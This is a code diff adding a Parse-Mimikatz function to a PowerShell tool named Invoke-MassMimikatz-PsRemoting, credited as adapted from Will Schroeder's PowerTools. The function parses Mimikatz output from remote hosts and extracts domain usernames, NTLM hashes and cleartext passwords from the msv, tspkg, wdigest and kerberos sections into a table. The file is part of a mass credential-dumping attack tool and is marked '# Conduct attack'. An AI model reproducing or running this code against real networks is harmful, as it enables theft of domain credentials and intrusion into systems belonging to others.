@@ -242,6 +242,130 @@ function Invoke-MassMimikatz-PsRemoting
 
                 return $TblMembers
             }
+
+            # ----------------------------------------
+            # Mimikatz parse function (Will Schoeder's) 
+            # ----------------------------------------
+
+            # This is a *very slightly mod version of will schroeder's function from:
+            # https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
+            function Parse-Mimikatz {
+
+                [CmdletBinding()]
+                param(
+                    [string]$raw
+                )
+    
+                # Create data table to house results
+                $TblPasswords = New-Object System.Data.DataTable 
+                $TblPasswords.Columns.Add("PwType") | Out-Null
+                $TblPasswords.Columns.Add("Domain") | Out-Null
+                $TblPasswords.Columns.Add("Username") | Out-Null
+                $TblPasswords.Columns.Add("Password") | Out-Null    
+
+                # msv
+	            $results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
+                if($results){
+                    foreach($match in $results){
+                        if($match.Contains("Domain")){
+                            $lines = $match.split("`n")
+                            foreach($line in $lines){
+                                if ($line.Contains("Username")){
+                                    $username = $line.split(":")[1].trim()
+                                }
+                                elseif ($line.Contains("Domain")){
+                                    $domain = $line.split(":")[1].trim()
+                                }
+                                elseif ($line.Contains("NTLM")){
+                                    $password = $line.split(":")[1].trim()
+                                }
+                            }
+                            if ($password -and $($password -ne "(null)")){
+                                #$username+"/"+$domain+":"+$password
+                                $Pwtype = "msv"
+                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null 
+                            }
+                        }
+                    }
+                }
+                $results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
+                if($results){
+                    foreach($match in $results){
+                        if($match.Contains("Domain")){
+                            $lines = $match.split("`n")
+                            foreach($line in $lines){
+                                if ($line.Contains("Username")){
+                                    $username = $line.split(":")[1].trim()
+                                }
+                                elseif ($line.Contains("Domain")){
+                                    $domain = $line.split(":")[1].trim()
+                                }
+                                elseif ($line.Contains("Password")){
+                                    $password = $line.split(":")[1].trim()
+                                }
+                            }
+                            if ($password -and $($password -ne "(null)")){
+                                #$username+"/"+$domain+":"+$password
+                                $Pwtype = "wdigest/tspkg"
+                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
+                            }
+                        }
+                    }
+                }
+                $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
+                if($results){
+                    foreach($match in $results){
+                        if($match.Contains("Domain")){
+                            $lines = $match.split("`n")
+                            foreach($line in $lines){
+                                if ($line.Contains("Username")){
+                                    $username = $line.split(":")[1].trim()
+                                }
+                                elseif ($line.Contains("Domain")){
+                                    $domain = $line.split(":")[1].trim()
+                                }
+                                elseif ($line.Contains("Password")){
+                                    $password = $line.split(":")[1].trim()
+                                }
+                            }
+                            if ($password -and $($password -ne "(null)")){
+                                #$username+"/"+$domain+":"+$password
+                                $Pwtype = "wdigest/kerberos"
+                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
+                            }
+                        }
+                    }
+                }
+                $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
+                if($results){
+                    foreach($match in $results){
+                        if($match.Contains("Domain")){
+                            $lines = $match.split("`n")
+                            foreach($line in $lines){
+                                if ($line.Contains("Username")){
+                                    $username = $line.split(":")[1].trim()
+                                }
+                                elseif ($line.Contains("Domain")){
+                                    $domain = $line.split(":")[1].trim()
+                                }
+                                elseif ($line.Contains("Password")){
+                                    $password = $line.split(":")[1].trim()
+                                }
+                            }
+                            if ($password -and $($password -ne "(null)")){
+                                #$username+"/"+$domain+":"+$password
+                                $Pwtype = "kerberos/ssp"
+                                $TblPasswords.Rows.Add($PWtype,$domain,$username,$password) | Out-Null
+                            }
+                        }
+                    }
+                }
+
+                # Remove the computer accounts
+                $TblPasswords_Clean = $TblPasswords | Where-Object { $_.username -notlike "*$"}
+
+                return $TblPasswords_Clean
+            }
         }
 
         # Conduct attack
